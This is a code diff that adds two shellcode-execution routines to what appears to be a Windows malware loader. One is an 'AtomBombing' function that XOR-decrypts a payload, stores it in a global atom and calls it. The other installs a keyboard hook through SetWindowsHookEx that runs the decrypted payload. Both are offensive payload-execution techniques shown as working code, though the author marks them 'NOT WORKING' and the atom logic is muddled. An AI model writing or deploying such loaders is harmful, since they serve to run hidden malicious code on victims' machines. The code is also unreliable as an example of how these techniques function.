@@ -16,6 +16,7 @@
 #include <string.h>
 #include <strsafe.h>
 #include <dbghelp.h>
+#include <string>
 //#include "helpers.h"
 //#include <wincrypt.h>
 #pragma comment (lib, "dbghelp.lib")
@@ -690,4 +691,55 @@ BOOL Hookem(char* dll, char* origFunc, PROC hookingFunc) {
 		thunk++;
 	}
 	return FALSE;
+}
+
+
+
+
+/**
+* Create an atom that contains our payload and execute it by reading its pointer
+* WARNING : NOT WORKING
+*/
+void AtomBombing(){
+	XOR((char*)payload, payload_len, (char*)key, sizeof(key));
+    printf("[+]\tCreating atom with payload\n");
+	std::wstring wideString(reinterpret_cast<wchar_t*>(payload));
+	LPCWSTR lpWideString = wideString.c_str();
+    ATOM malAtom = GlobalAddAtom(lpWideString);
+	printf("[+]\tRetrieving atom function adress\n");
+	HMODULE hModule = LoadLibrary(TEXT("kernel32.dll")); 
+	FARPROC malFunc = GetProcAddress(hModule, MAKEINTRESOURCEA(malAtom));
+	printf("[+]\tExecuting atom function :)\n");
+    malFunc();
+    GlobalDeleteAtom(malAtom);
+}
+
+
+
+
+
+/**
+* Execute payload through setWindowsHookEx technique
+* WARNING : NOT WORKING
+*/
+LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam){
+	void (*shell)() = (void (*)())payload;
+	shell();
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+void SetWinHookEx(PROCESS_INFORMATION pi){
+	HMODULE hModule = LoadLibraryA("user32.dll");
+	DWORD dwThreadId = pi.dwThreadId;
+	printf("[+]\tCreating hook\n");
+	typedef HHOOK(WINAPI* SetWindowsHookExFn)(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId);
+	SetWindowsHookExFn setHook = (SetWindowsHookExFn)GetProcAddress(hModule, "SetWindowsHookExA");
+	HHOOK hHook = setHook(WH_KEYBOARD, HookProc, NULL, dwThreadId);
+	MSG msg;
+	printf("[+]\tDecrypting payload\n");
+	XOR((char*)payload, payload_len, (char*)key, sizeof(key));
+	while (GetMessage(&msg, NULL, 0, 0)){
+		printf("[+]\tExecuting hook :)\n");
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
 }
